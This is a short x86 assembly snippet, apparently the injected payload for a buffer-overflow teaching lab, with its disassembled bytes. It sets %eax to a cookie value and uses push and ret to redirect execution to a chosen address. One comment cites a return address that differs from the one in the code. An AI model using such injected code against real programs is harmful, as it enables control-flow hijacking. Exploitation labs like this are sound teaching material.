.code32
.section .data
.section .text
.globl _start
_start:
    movl $0x17dab4ef,%eax       # cookie加载到%eax
    push $0x8048ce2             # 0x8048e50是原本应该返回的地址
    ret

# 00000000 <_start>:
#    0:   b8 ef b4 da 17          mov    $0x17dab4ef,%eax
#    5:   68 e2 8c 04 08          push   $0x8048ce2
#    a:   c3                      ret    